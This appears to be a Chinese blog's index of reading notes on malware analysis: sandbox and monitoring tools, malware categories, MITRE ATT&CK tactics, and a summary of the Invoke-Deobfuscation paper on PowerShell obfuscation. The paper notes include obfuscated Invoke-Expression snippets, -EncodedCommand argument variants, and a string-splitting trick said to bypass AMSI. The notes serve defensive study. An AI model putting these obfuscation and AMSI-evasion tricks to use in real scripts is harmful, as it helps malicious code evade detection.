Sandboxie：这个工具的主要目的不仅仅是记录文件操作，而是让研究人员访问创建/修改的文件。如果恶意软件掉落或下载额外的模块并随后删除它们，这是非常有用的。(这个地方暂时没有明白是什么意思，我原以为只要在Sandbox中创建的文件，即使删除了也有办法恢复，但是我自己测试没有恢复。) 注册表Process Monitor (Regmon) Regshot Autoruns 进程操作Process Monitor(Procmon) Process Explorer WinAPIsAPI Monitor Network activityTcpview Wireshark Sandboxes沙箱也有很多限制 沙箱不知道恶意软件执行的环境，比如需要什么命令行啥的 很容易的被检测到，恶意软件可能立刻终止或者表现出假的活动 它们的可见性是有限的，因为它们通常只显示恶意软件的一部分功能 ‍ 在线沙箱服务 https://any.run https://www.hybrid-analysis.com https://virustotal.com (the Behavior tab) 自管理沙箱 Cuckoo(Free) DRAKVUF Sandbox(Free) VMRay(Commercial) ‍","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"}]},{"title":"《Mastering Malware Analysis》第一章","slug":"Mastering_Malware_Analysis_Chapter_1","date":"2023-02-20T08:00:00.000Z","updated":"2023-02-26T09:57:02.363Z","comments":true,"path":"2023/02/20/Mastering_Malware_Analysis_Chapter_1/","link":"","permalink":"https://zzzzsky.github.io/2023/02/20/Mastering_Malware_Analysis_Chapter_1/","excerpt":"","text":"Mastering Malware Analysis Chapter 1 只记录想记录的，一些熟练的就不记录了~ ~ ~CTI：Cyber Threat Intelligence IoCs: Indicator of Compromise IoAs: Indicators of Attack NDRs: Network Detection Responses 为什么分析恶意软件恶意软件分析在事件响应中攻击发生—&gt;取证—&gt;发现malware–&gt;分析 发现所有的IoCs 理解Payload的能力 解密和理解在malware和attacker之间的网络流量 为了达到大的覆盖范围，基于Windows的恶意软件仍然是最盛行的（因为它常用），再就是Android, IoT ‍ 探索恶意软件类型恶意软件种类恶意软件的种类通常由他的影响或传播方法定义。下面是常用的例子 Trojan: 最常见的恶意软件种类，在用户不知情的环境中执行恶意活动，得名于传说中征服特洛伊城的特洛伊木马。 Downloader:下载执行外部的payload Dropper: 在这里额外的payload不是下载的，而是从Trojan的主体中释放出来的 Backdoor, 被称为Remote Access Trojan(RAT): 在这里，恶意软件可以接受远程命令来表现一些行为 Ransomware, 勒索病毒 Infostealer, aka Password Stealer(PWS): ​窃取信息 Spyware:范围相比Infostealer更广泛，可能包含视频，音频录制或者GPS跟踪等 Banker: 应该是属于Infostealer的范畴，但是他目的更窄，然后潜在的功能范围大，在这里，恶意软件可能非常专注于获取资金，因此它也可以支持拦截银行发送的一次性令牌，作为双因素身two-factor authentication(2FA)的一部分。修改财务信息以重定向支付，或注入脚本以拦截输入的银行凭证。 Dos: Denial of Service (DoS)，目的是使目标系统或服务不能用 Wiper: 在这里，恶意软件被用来删除对系统操作敏感或关键的信息，使其成为DoS攻击的另一个工具。 DDos: Distributed Denial of Service (DDoS) 大量的bots通过网络攻击受害者 Spammer, aka spambo: 代表受害者发送垃圾邮件 Clicker：在这里，攻击者可以模拟真实的用户点击，从广告，搜索引擎中毒，或推广虚假账户中获得资金。 Miner:挖矿 Packed: 与实际的威胁无关，这个名称的意思就是这个样本被恶意保护起来了 Injector: 用到了注入 Worm: ​可以在不同机器间自我传播 **Virus:**与机器间传播的蠕虫不同，文件感染程序的主要目标是通过感染其他可执行文件和文档在当前系统内传播。在这种情况下，当受害者打开/启动合法文件时，控制权也会交给恶意代码。它的使用方式有多种，从实际将恶意代码和数据写入可执行文件，到向文档添加宏模板，再到简单地用受害者文件的主体替换受害者文件，并将原始文件的副本存储在其他地方以供以后执行。 Rootkit: 之前用来定义提升权限的工具，现在常用定义威胁，这些威胁要么用来隐藏其它威胁，要么只是在内核模式下操作。 Bootkie: 这些威胁会将自己插入到引导过程中，从而在操作系统之前获得访问权限。 Exploit: 利用漏洞 FakeAV: 这类威胁向用户显示各种关于其系统据称存在的关键问题的警告，并强烈要求用户购买“完整版本”来修复它。 Hoax: 吓唬用户不存在的问题 PUAs: 指潜在的不想要的应用程序，比如在后台悄悄的安装并不需要的软件 Adware: 广告 Hacktool: ​很大类别，涉及攻击者和网络安全人员都可以使用的很多工具，例如用于红队目的的 Dual-use tools: 攻击者和合法用户都可以使用的工具，比如Sysinternals的psexec工具 命名规范没有统一的标准，通常检测名字包含目标平台，恶意软件种类和家族，有时候也包含版本和检测技术 下面是基于VirusTotal对恶意样本 9e0a15a4318e3e788bad61398b8a40d4916d63ab27b47f3bdbe329c462193600​的不同命名 Avast: ELF:CVE-2017-17215-A [Expl] DrWeb: Linux.Packed.1037 Kaspersky Lab: HEUR:Backdoor.Linux.Mirai.b Microsoft: Trojan:Win32/Ceevee Sophos: Linux/DDoS-CI Symantec: Trojan.Gen.NPE MITRE ATT&amp;CK框架解释全称为 Adversarial Tactics, Techniques, and Common Knowledge 正如我们之前提到的，不同的网络安全供应商通常给黑客组织和恶意软件家族起不同的名字。因此，知识交流变得更加复杂，最终影响了社区的绩效。MITRE ATT&amp;CK框架的创建就是为了解决这个问题和其他类似的问题，并让安全专家使用相同的语言。这是一个与供应商无关的全球知识库，它将各种攻击技术分组为战术，还提供了攻击者和恶意软件使用它们的示例，并为这些战术提供了广泛接受的名称。 ‍ 基本的术语Tactic: 表示攻击者的高级目标，执行相应动作的原因 Technique: 实现高级目标的具体实现方法 Sub-technique: 一个关于某个操作具体执行更细节的描述 Procedure: technique和sub-technique的具体实现 TTPs：代表Tactic、Technique和Procedure对攻击者使用的方法进行总结，并解释利用这些方法可以达到什么目的 Group: 代表一组相关的对抗活动，可能由在这个名字下面的已知的一个单独的实体执行^（不明白啥意思。。。 ）^ Mitigation: 为了规避和预防攻击的技术和概念 Software:用来执行敌手行动的代码，有公开的获得工具和恶意软件结合 Matrix: 与特定行业相关的TTP的组合 ‍ 这个框架下有很多Matrix,企业的，ICSs(Industrial Control Systems), 和移动端，最常使用的是企业Matrix 企业Matrix目前，企业框架定义了下面的tactics Reconnaissance: 勘察，这个阶段涉及到收集关于受害者的相关信息，比如一些组织的基础设施和人员 Resource development: 在这里，攻击者根据收集到的信息建立所有必需的依赖关系。这可以通过各种方式实现:购买/租用、创建或窃取先决条件(例如，主机或软件) Initial access: 在这里，攻击者尝试在受害者的环境中建立一个据点，最常见的例子就是钓鱼邮件 Execution: 这里，攻击者执行任何种类的代码来实现目标 Persistence: 比如SSH Privilege escalation: 高权限可以更多控制 Defence evasion: 主要目标是隐藏不被发现 Credential access: 这个策略包括窃取凭据以便以后的使用，比如最常见的一些技术涉及dump保存的凭据并拦截，例如通过记录按下的键 Discovcery: 攻击者收集通过网络和当地的系统收集受害者环境的内部信息，以便于促进其他的策略，比如横向移动 Lateral movement: 攻击者开始传播到其他的机器直到遇到感兴趣的。 Collection: 收集感兴趣的信息 Command and control: 这种策略涵盖了攻击者可能与受损系统远程通信的各种方式。 Exfiltration: 将敏感信息移出受威胁的环境 Impact: 最终，这个策略用来藐视攻击者可能对妥协系统带来消极影响的其他方式，比如操作，中断或者破坏关键的系统和数据。 STIX(Structured Threat Information Expression) 用来交换IoCs, 版本1是XML格式，版本2是JSON格式， APT and zero-day attacks and fileless malwareAPT: 高级可持续性威胁 Zero-day: 之前不知道的漏洞 Fileless malware: 无文件攻击，利用脚本命令 ‍ 选择分析策略理解受众获取结果的用户不同，行动的成果可能是非常不同的 Threat intelligence: 获取IoCs，如哈希值、文件名和网络构件，因此，提取嵌入式有效载荷和下载远程样本，以及寻找其他相关模块，并从所有这些模块中提取C&amp;C信息，可能将成为首要任务。 AV detection: 创建一个不会产生误报的检测，比如于恶意功能相关的字符串或代码片段以及使用的自定义的加密算法。理解主要逻辑将有助于选择正确的类别，代码和数据相似性将有助于分配恶意软件家族。 Technical article or conference presentation: 在这里，最重要的部分将是与功能、与其他恶意软件家族的相似性以及参与者属性相关的有趣的新技术细节。 Article for the general public: 对于非技术人员，通常只提供功能的高级描述，而不提供许多技术细节，主要关注影响。 回答受众的问题 定义目标避免不必要的技术细节 根据目标受众选择所需的细节级别 如果某些事实对读者没有帮助，避免详细阐述 不要只提到技术细节——解释它们的高级目的以及为什么攻击者必须明确地使用它们 典型的工作流我们怎样组织我们的工作以及时地产生尽可能好的结果？ Triage: 收集样本中容易获得的大量的信息： 分析PE头 检查这个样本是否可能被加壳 检查公共资源中已知的IoCs（哈希值，网络组建,AV检测名字等） 行为分析：大部分信息将从文件、注册表和网络操作中获得。这样，我们就会对潜在样本的能力有一个概念。 脱壳：如果不脱壳没法进行静态分析，当然有的样本可能没有加壳 静态分析：在反汇编器和反编译器打的帮助下进行，从可用的字符串和常被误用的winapi开始。 动态分析：在调试器的帮助下进行，设置和执行可能很expensicve，所以只在需要的时候使用它。 确认某些功能 处理字符串/API/嵌入的payload/通信加密 ‍ ‍","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"}]},{"title":"《Invoke-Deobfuscation:AST-Based and Semantics-PreservingDeobfuscation for PowerShell Scripts》论文阅读","slug":"paper2_Invoke-Deobfuscation","date":"2022-11-15T14:00:00.000Z","updated":"2023-02-20T08:41:58.524Z","comments":true,"path":"2022/11/15/paper2_Invoke-Deobfuscation/","link":"","permalink":"https://zzzzsky.github.io/2022/11/15/paper2_Invoke-Deobfuscation/","excerpt":"","text":"2. Invoke-Deobfuscation:AST-Based and Semantics-PreservingDeobfuscation for PowerShell Scripts‍ 信工所的一个硕士毕业生发表在DSN上的，他现在在奇安信工作 ‍ 这篇文章讲了基于AST的，变量追踪的，保留语义的一个去混淆工具，是开源的 https://gitee.com/snowroll/invoke-deobfuscation?_from=gitee_search 介绍主要工作利用AST的可恢复节点来精确的识别模糊片段，通过Invoke函数和变量跟踪来模拟恢复过程 ‍ 现存方法去混淆主要分为3步 识别混淆片段 去掉混淆 重建脚本 识别混淆PSEDM, PSDecode, PowerDrive, and PowerDecode 设计了一系列正则表达式去匹配混淆的片段，这些基于正则表达式的方法忽略了脚本的语法信息 Li et al.(也就是轻量级的那个论文作者) 设计了一个基于机器学习的分类器去识别模糊的脚本片段，这非常依赖训练的数据 ‍ ‍ 去掉混淆 预定义的恢复规则 [PSDecode, PowerDrive, Powerdecode] 这种方法仅仅对一部分特别混淆技术有用，但是忽略了语法，所以经常出错 覆盖函数 [PSDecode, PowerDrive, Powerdecode] 这种方法用来处理特定函数的混淆的参数，比如Invoke-Expression， 直接执行 [Powerdecode, Li et al轻量级去混淆工具] 由于大多数混淆后的脚本片段中保存着恢复代码 + 混淆数据，所以直接执行也可以，但是这部分有个缺点，就是容易忽略掉上下文，有时候这些片段中含有变量，忽略了上下文就无法识别这个变量，即无法去混淆。 重建脚本先有的所有的脚本重构都是上下文无关的，因此他们恢复后在语法或语义上可能存在错误 挑战 精确识别混淆的片段 正确恢复混淆的片段 有效重建脚本，使其在语法和语义上与原始脚本保持一致 ‍ 我们的方法Invoke-Deobfuscation‍ 基本思路 基于token和recoverable nodes of AST 识别混淆片段 利用跟踪变量算法 来获取混淆片段的上下文，并且利用Invoke函数来恢复他们 基于后续遍历AST的方法重构脚本，而且在合适的位置严格的替换混淆的片段，来尽可能的保持原来的语义 样本样本 2,025,175 wild malicious samples –预处理-&gt; 39,713 PowerShell scripts ‍ 评估从4个方面来评估 Invoke-Deobfuscation 处理不同混淆技术的能力 去混淆的效力和效率 语义一致性 obfuscation mitigation(混淆减轻的能力？？) ‍ 和 PSDecode， PowerDriver, PowerDecode, 和Li et al 这 4中对比 经过评估，Invoke-Deobfuscation 是表现最好的工具 足够强壮，可以处理几乎所有已知的混淆 有效且稳定 对于恢复关键信息，IP, URL等，Invoke-Deobfuscation 恢复的数量是其他工具的两倍多（Datacon 2022比赛，，，）​ 恢复的结果能够与原始脚本在语义上保持一致 可以显著的减轻脚本混淆 ‍ ‍ ‍ 背景和动力PowerShell 和 PowerShell 攻击PowerShell 是命令行shell，也是一门脚本语言，他提供了对于一个计算机内核史无前例的权限，包括对Win32API不限制的使用。它还是跨平台的，并且预装在Windows系统上，所以PowerShell已经变为了大量攻击者的喜欢的工具。 #PowerShell 非常广泛的使用在网络攻击中，比如勒索软件，钓鱼邮件，持续性威胁等等，攻击者能够利用恶意的PowerShell脚本在受害者电脑上安装木马，偷取机密信息或者获得管理员权限。PowerShell攻击不仅能从远程网址下载可执行的文件，并且可以做到不落地执行，这样就绕过了传统的基于文件的防御方法。#​ ‍ 针对POWERSHELL的混淆技术Powershell有一堆混淆技术，针对其复杂性，把它分为三个等级 原始样本： L1: 这种混淆技术只具有视觉上的混淆性 比如，加入空白空格，随机大小写，反引号，别名 L2: 这种级别的混淆技术可以修改原始脚本的词法特性 和AST的层次结构，但是仍然保留着原始脚本的字符级别的信息 L3: 相比L2，去除掉字符级别的信息 比如：Base64， ASCII等编码都属于这种混淆技术 ‍ 混淆对恶意检测的有效性混淆后的PowerShell脚本能够隐藏掉原始脚本的意图，并且很容易的避开反病毒软件的检测。 当前的恶意检测模型主要取决于字符集的特点或者AST特征，然而这些都能很容易的被混淆完全的改变（这里的模型我感觉说的应该是人工智能方面的模型） ‍ 方法论Invoke-Deobfuscation 框架 ‍ 主要分为3个阶段 令牌解析 基于AST的变量跟踪和恢复 重命名+格式化代码 令牌解析令牌解析使用脚本的词汇信息来恢复混淆，大多数的在L1级别的混淆技术都与令牌相关。 用微软的官方库System.Management.Automation.PSParser​去tokenize， 每个令牌都有许多属性，比如内容，开始位置，长度等，我们利用这些属性去恢复原始的token，并将他们组合来形成去混淆的脚本。 ‍ 图3表示一个简易的令牌解析的过程 逆序的处理顺序允许我们在不解析新脚本的情况下识别未处理的令牌。最终能够得到一个在令牌级别没有混淆的脚本。 ‍ 基于AST的恢复不管这个混淆后的脚本多么复杂，他都是原始脚本在经过一系列变化后得到的。混淆后的脚本片段通常包括 混淆的数据以及它的恢复算法，我们称之为可恢复的脚本片段（Recoverable Pieces） 去混淆的关键就是在混淆后的脚本中识别这些Recoerable Pieces​ ‍ 识别可恢复的片段我们使用Powershell AST上特定类型的节点 的内容来识别可恢复的脚本片段。 PowerShell AST上的每一个节点都是语法上有效的，其中包括Recoverable pieces。 我们能够获得原始的片段通过执行这个Recoverable pieces. 例如，’he’ + ‘llo’ –&gt; ‘hello’ 因此，我们分析了所有的PowerShell的AST节点的类型，发现这些类型的节点的内容通过执行后可以获得字符串。^(怎么发现的？？？这个地方感觉可以优化一下。)^ 我们叫这些类型的节点为Recoverable nodes PipelineAst UnaryExpressionAst BinaryExpressionAst ConvertExpressionAst InvokeMemberExpressionAst SubExpressionAst 我们提取了这个可恢复节点的内容作为Recoverable Pieces. 基于可恢复的节点，我们不仅能识别已知的混淆技术，还可以识别未知的混淆技术。 ‍ 基于Invoke的恢复把Recoverable Pieces转为Script Block，然后利用成员函数Invoke去执行他本身, 比如 1234$a = &#123;&#x27;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#x27; -f &quot;i&quot;, &quot;e&quot;, &#x27;x&#x27;&#125;$a.invoke()# iex 对于不同类型的执行结果，我们将它们转换为相应的字符串形式作为恢复结果，以保留它们的语义。比如得到结果是123，如果他的类型是字符串，则结果为’123’，如果是数字，则是123 如果执行结果不能以字符串的形式表示，比如是Object，那么我们保留可恢复的脚本片段。 ‍ 对于可恢复的脚本片段可能包含很多与恢复过程不相关的命令，比如Restart-Computer​, Start-Sleep​等。因此，我们创建了这些命令的阻止列表，以加快去混淆的速度。如果可恢复的脚本片段中含有这些不相关的命令，我们不去执行他们，为了安全，我们的工具应该运行在独立的沙盒中。 ‍ 变量追踪由于上下文的缺乏，我们不能直接执行这些含有变量的Recoverable pieces 为了克服这个挑战，我们使用符号表来记录脚本中出现的变量的范围和值，伪代码1显示了变量^（这个算法，不能修改循环中的遍历 \\）^​追踪^（这个算法，不能修改循环中和条件表达式中的变量）^​的算法。^(这个算法，不能修改循环中的遍历 )^ 通过下面这个例子更容易理解上面的算法 123456789101112131415# PowerShell代码如下 $a = 1Write-Host $a# 解析为AST并可视化后为[NamedBlockAst]: $a = 1 Write-Host $a --[AssignmentStatementAst]: $a = 1----[VariableExpressionAst]: $a ----[CommandExpressionAst]: 1 ------[ConstantExpressionAst]: 1--[PipelineAst]: Write-Host $a ----[CommandAst]: Write-Host $a------[StringConstantExpressionAst]: Write-Host------[VariableExpressionAst]: $a 我们通过AST的结构来记录出现在脚本中的每一个变量的范围。我们把变量分为3类，局部变量，全局变量，环境变量，我们仅仅需要记录局部变量的范围。 ‍ 我们后序遍历AST，并记录当前访问节点的范围​。 仅仅访问6种类型的节点的时候，当前节点的范围深度会增加或降低。变化取决于遍历的方向，从父级到子级或者反过^（这里暂时不明白）^ NamedBlockAst IfStatementAst WhileStatementAst ForStatementAst ForEachStatementAst StatementBlockAst 我们通过执行分配表达式来记录变量在符号表中的值​ 通过AssignmentStatementAst​，我们能够识别变量和他们的分配表达式。当这个分配表达式含有未知的变量，并且这个变量是不在符号表里的时候，我们不执行这个变量表达式，而且放弃记录这个变量。 对于环境变量，我们能够使用 Get-Variable 来获得他们正确的值 我们当前的变量跟踪仍然后许多限制^（确实。。）^ ‍ Invoke-Expression和PowerShell复杂的混淆脚经常包含多层混淆​，比如Invoke-Expression 就可以把后面的字符串作为脚本去执行，而字符串中可能还含有Invoke-Expression等。 ‍ 处理多层混淆的关键就是识别Invoke-Expression​和PowerShell​，然而攻击者经常使用不同的方法来混淆这些命令，例如，.($pshome[4] + $pshome[30] + &#39;x&#39;)​就等同于 Invoke-Expression​, 可以通过变量跟踪将其恢复为.(&#39;iex&#39;)​, iex是Invoke-Expression的别名，. 是可以把后面的字符串作为命令，其他的Invoke-Expression的形式为 123iex&#x27;xxx&#x27; | iex&amp;&#x27;iex&#x27; 我们能够通过基于AST的变量追踪和恢复来识别Invoke-Expression的不同格式。 ‍ PowerShell能够执行Base64-encoded命令，通过-EncodedCommand​，这个参数也有各种形式，比如-e​, -eNc​等 我们转变参数为小写，并且使用&#39;-encodedcommand&#39;.StartsWith($param)​去决定是否这个参数是 -EncodedCommand​，比如&#39;-encodedcommand&#39;.StartsWith(&#39;-enc&#39;)​为True ‍ 为了处理多层混淆，我们转换Invoke-Expression和PowerShell的参数，而且去混淆。 重复这个过程，，直到脚本的恢复过程不再发生转换，通过这种方式，我们可以从多层混淆的脚本片段中恢复出原始的脚本片段 ‍ 脚本重建通过后序遍历的方法去进行脚本重建，当访问一个节点的时候，用它的孩子节点的内容去替换它 如果内容是混淆的，则用它的恢复结果去替换它 最终，我们能够得到完整的去混淆的脚本，通过遍历这个AST的根节点。 我们在合适的位置替换混淆脚本片段，以使去混淆的脚本 与 混淆的脚本 语义保持一致 这个图是一个例子 最终，访问AST的根节点就可以得到最终的去混淆的脚本。 ‍ 重命名和格式化重命名那些随机命名的变量和函数以及重新格式化代码可以使分析人员共容易分析脚本。 我们根据元音和特殊字符的比例来确定字符串是否是随机的。 Hayden[29]指出，在普通美式英语中，元音的比例约为37.4%，因此我们假设当英语字符中元音的比例不在32%到42%之间时，字符串是随机的。当一个字符串中的英文字母的比例小于10%时，字符串是随机的，然后用var&#123;num&#125;​ 和 func&#123;num&#125;​去重命名随机的变量 最后，我们通过删除随机空白字符并用标准格式缩进来重新格式化代码。如图7所示，随机变量名被替换，随机空白字符被删除，此外，这个模块是可以扩展的。 ‍ ‍ 实施和评估在这一节中，首先介绍Invoke-Deobfuscation的实施，然后再与其他4个工具进行比较，PowerDrive [17], PSDecode [16], PowerDecode [18], Li et al. [19] ‍ [16] “Psdecode - powershell script for deobfuscating encoded powershell scripts,” https://github.com/R3MRUM/PSDecode.[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accurate de-obfuscation and analysis of powershell malware,” in Springer DIMVA, 2019.[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerdecode: a powershell script decoder dedicated to malware analysis,” in ITASEC, 2021.[19] Z. Li, Q. A. Chen, C. Xiong, Y . Chen, T. Zhu, and H. Yang, “Effective and light-weight deobfuscation and semantic-aware attack detection for powershell scripts,” in ACM CCS, 2019. 主要从4个方面进行比较 处理常见混淆方法的能力 去混淆的效力和效率 行为一致性 obfuscation mitigation 实施Invoke-Deobfuscation用PowerShell编写，源码2500行，而且工具跨平台。 Invoke-Deobfuscation 主要包含3个模块，每个模块独立使用^（在Datacon的比赛中应该只用去混淆的那个就行）^ 为了避免出现语法错误，在去混淆的过程中，每个步骤之后都要检查结果的语法，如果有语法错误，则跳过deobfuscation步骤 ‍ 评估方法数据收集在奇安信的帮助下，我们收集了2025175个恶意样本，根据来源，分为2类，第一类是由反病毒软件标记为powershell的样本，第二类是由TrID或文标记为powershell的样本。 我们利用样本的语法信息和文本特性删除了无效的或重复的PowerShell样本。然后我们得到了1127349个PowerShell脚本。 我们发现同一家族中许多恶意脚本的结构高度相似，所以有去除了这些结构相似的样本。 经过预处理，最终得到了39713个样本，以前的数据集只包含少数类型的混淆技术[30]，甚至来自手动生成[19]。与之前的数据集相比，我们数据集中的脚本的混淆技术、恶意功能和内容结构更加多样 [30] J. White, “Pulling back the curtains on encodedcommand powershell attacks,” https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks 这些脚本的文件大小从8字节到26 MB，数据集的总大小为7.75 GB。 ‍ 混淆的量化我们通过对已知的混淆进行评分，进而来量化样本的混淆。比如，在前面的时候，将混淆分为3个等级，L1,L2,L3，比如L1就1分，我们为每个脚本中出现的每种类型的混淆只打分1次，以获得脚本的最终混淆分数。 ‍ 评估结果混淆能力去混淆的能力取决于它的精确的识别混淆 + 准确的去除混淆 我们利用已知的混淆技术去混淆命令 write-host hello​并把混淆后的片段放在3个不同的位置 单独一行 分配表达式 管道 比如假如混淆后的片段是&#39;a&#39;+&#39;b&#39;​ 则分为&#39;a&#39;+&#39;b&#39;​, $tmp=&#39;a&#39;+&#39;b&#39;​, &#39;a&#39;+&#39;b&#39; | out-null​ 对于某种特定的混淆技术，如果一个工具能够恢复出这3个位置的混淆片段（当然，这3个位置的混淆片段肯定是由这种特定的混淆技术去混淆的，不能是其他的），则说明这个工具 针对这种混淆技术 有完全的去混淆能力。 为了比较，对之前的工具做了点稍稍的改动，比如 PSDecode、PowerDrive和PowerDecode使用不同的层来存储不同阶段的混淆结果，我们仅仅保留最后一层作为最终结果。 Li 等人使用分类器来识别AST混淆的子树，但是它这个模型未公开，此外，Li 等人只处理源代码中类型为PipelineAst的子树，因此我们删除了分类模块，并使其工具遍历所有根为PipelineAst的子树，这只会影响一点点运行时间。 ‍ 这个图是不同工具的去混淆能力的比较结果 由于变量追踪的局限性，我们无法处理经常有循环语句的空白编码混淆^（所以这种编码是啥玩意，，，暂时看不懂）^，然而，这种空白编码混淆仅占数据集的0.1% ‍ 作为比较 PSDecode, PowerDrive和PowerDecode仅仅能处理一些混淆技术，因为它们使用正则表达式​来匹配特定的混淆技术，而忽略了脚本的语法。此外，正则表达式需要设计不同的模式来匹配不同的混淆技术，这是不健壮的，无法识别复杂的混淆脚本片段 ‍ Li 等人只处理PipelineAst节点上的混淆，该节点是粗粒度​的，将会错过许多混淆处理的脚本片段。 它们无法处理识别和处理最后2个位置的混淆，即上面的 分配表达式 和 管道 此外，由于缺乏上下文，它们无法处理带有变量的混淆技术。 ‍ 由于这四种工具都没有分析脚本的token，所以它们无法处理在token级别的混淆。 ‍ 去混淆的效果和效率我们比较不同工具去混淆的效果​，通过不同工具去混淆后的脚本中保留的关键信息的数目 同时，我们记录这些工具的去混淆时间来作为效率​的评估 ‍ 我们抽样了100个大小介于97byte - 2KB之间的混淆后的PowerShell代码，挑选了4中关键信息 .ps1 文件（通常表示恶意脚本路径） PowerShell命令 URL IP 这4种类型的信息对于恶意样本分析来说都是有意义的 ‍ 为了更好的比较，我们采用手动的去混淆的结果作为基准，然后我们分别提取了这4种类型的关键信息。除此之外，还有12个多层混淆的样本，因此我们比较不同的工具处理多层混淆的能力。 ‍ ​ ‍ 先看图5（Effectiveness） Invoke-Deobfuscation相比其他工具恢复了更多的关键信息，并且平均96.8%的结果是跟手动处理相同的。这是因为 Invoke-Deobfuscation可以基于AST可恢复节点能够识别和恢复更多的混淆片段。 再看图6 （Efficiency） Invoke-Deobfuscation表现的最有效率和稳定。他的平均处理时间是1.04秒，是所有工具平均时间最少的一个，而且其他的工具处理时间波动比较大，甚至超过了10秒，由于其他工具可能执行了与恢复不想关的命令，比如network connect等， 由于Invoke-Deobfuscation能够通过他的内置的阻止列表，来阻止这些不相关的命令的执行，所以它处理混淆的速度很快。 ‍ ​ ‍ 再看表三（处理多层混淆的能力） 因为多层混淆脚本经常需要调用invoke-Expression 和 PowerShell， 所以Invoke-Obfuscation能够处理。 PSDecode、PowerDrive和PowerDecode利用overriding function^(这里overriding function是啥玩意，由于没看这3篇对应的论文，所以我也不知道是啥。。。等之后看了再回来弄吧)^获得未混淆的脚本，但是overriding function只能处理单层混淆。 PowerDecode设计了Unary Syntax Tree Model来处理多层混淆，所以他的效果要较好一点，但是如上面的Table II，他只能处理一部分混淆技术的混淆 Li 等人不能处理多层混淆。 ‍ 行为一致性为了量化分析，我们使用了行为一致性来代替语义的一致性。 为了简化分析，我们只比较了原始样本和去混淆后的样本的网络行为，比如DNS查询和TCP连接 使用TianQiong 沙盒来收集网络行为。 ​ 减轻混淆为了评估不同工具减轻复杂脚本上的混淆的能力，我们统计并比较原始样本和去混淆样本​中已知混淆技术的比例 选了3346个高混淆分数的样本，并且限制所有的工具，每个样本去混淆的时间为4分钟。 基于AST的可恢复节点和正则表达式，我们可以精确地识别每种已知的混淆技术 ‍ ​ ‍ 案例研究为了直观的比较和分析不同工具的去混淆效果，用不同工具去处理同一个样本，这个样本带有L1, L2, L3级别的混淆。 讨论语义一致性现有工具的去混淆结果在语义上通常与其对应的混淆脚本不一致 正则表达式经常标识语法无效的脚本片段[16]-[18]，基于机器学习的分类器严重依赖于训练数据的质量[19]，预定义的恢复规则[16]–[18]和重写函数[16]，[18]只能处理一些特定的混淆。由于缺乏上下文，直接执行[18]、[19]可能会得到错误的恢复结果。 [16] “Psdecode - powershell script for deobfuscating encoded powershell scripts,” https://github.com/R3MRUM/PSDecode.[17] D. Ugarte, D. Maiorca, F. Cara, and G. Giacinto, “Powerdrive: Accurate de-obfuscation and analysis of powershell malware,” in Springer DIMVA, 2019.[18] G. M. Malandrone, G. Virdis, G. Giacinto, and D. Maiorca, “Powerdecode: a powershell script decoder dedicated to malware analysis,” in ITASEC, 2021.[19] Z. Li, Q. A. Chen, C. Xiong, Y . Chen, T. Zhu, and H. Yang, “Effective and light-weight deobfuscation and semantic-aware attack detection for powershell scripts,” in ACM CCS, 2019. Invoke-Deobfuscation利用令牌解析和AST的可恢复的节点，能够精确的识别混淆的片段，此外，在这个变量追踪的帮助下，Invoke-Deobfuscation能够以上下文感知的方法去恢复正确的结果。此外，Invoke Deobfuscation严格替换已混淆的脚本片段，以保持Deobfuscation脚本的语义一致。 与AMSI比较AMSI是 Windows反恶意软件扫描接口 (AMSI) ‍ ASMI是一个多功能的接口，它允许文件，内存，流扫描，URL/IP信誉检测和其他的检测[14] [14] “Antimalware scan interface (amsi),” https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal 在提交给脚本引擎之前，这个脚本可能会经过若干层的去混淆。AMSI能够获得最终的提供给脚本引擎的脚本。 然而，此方法只能处理需要由InvokeExpression或PowerShell调用的特定类型的混淆 当这个混淆的脚本片段不需要被调用的时候，AMSI不能获得去混淆的片段，例如，AmsiUtils被AMSI对待为一个恶意的字符串，我们可以很容易的去绕过检测，比如”Amsi” + ‘Utils’ ‍ 尽管AMSI在处理许多混淆脚本上是很强大的，但是由于固有的机制，不同的混淆技术很容易绕过他 我们在虚拟机上运行前面IV-C2提到的100个PowerShell样本，并分析AMSI捕获的最终脚本，我们的分析标明，如第III-B4节所述，Invoke-Deobfuscation鱼油与AMSI相似的去混淆能力，除此之外，Invoke Deobfusion足够强大，可以处理不同的混淆技术 ‍ 限制变量追踪放弃记录条件语句中的变量和循环语句中的变量 ‍ 复杂混淆大多数的混淆数据和他们的相应的恢复算法都在相同的混淆片段里面，因此识别这些混淆片段并且执行就能够恢复原始的脚本片段。即使他们在不同的位置，我们也能够处理用变量追踪的方法去处理他们。 然而，如果攻击者把这个恢复算法放进了函数里，然后利用函数去恢复数据，则本文方法很难追踪这个混淆的链，甚至攻击者能够使用函数嵌套来反分析。 ‍ 相关的工作检测恶意脚本最近，许多基于机器学习或者深度学习的恶意脚本检测模型已经提出来了，这些模型基于不同的特征对恶意样本进行分类，如文本[8]、[26]、[27]、令牌和AST节点特征[9]、[10]。 [8] D. Hendler, S. Kels, and A. Rubin, “Detecting malicious powershell commands using deep neural networks,” in ASIACCS, 2018. [9] G. Rusak, A. Al-Dujaili, and U.-M. O’Reilly, “Ast-based deep learning for detecting alicious powershell,” in ACM CCS, 2018.[10] Y . Fang, X. Zhou, and C. Huang, “Effective method for detecting malicious powershell scripts based on hybrid features,” Neurocomputing, 2021. [26] Choi, Sunoh, “Malicious powershell detection using attention against adversarial attacks,” Electronics, 2020.[27] S. Choi, “Malicious powershell detection using graph convolution network,” Applied Sciences, 2021. 因为混淆很容易改变这些特征，许多研究者提议检测混淆的样本 [34] D. Bohannon and L. Holmes, “Revoke-obfuscation - powershell obfuscation detection framework,” 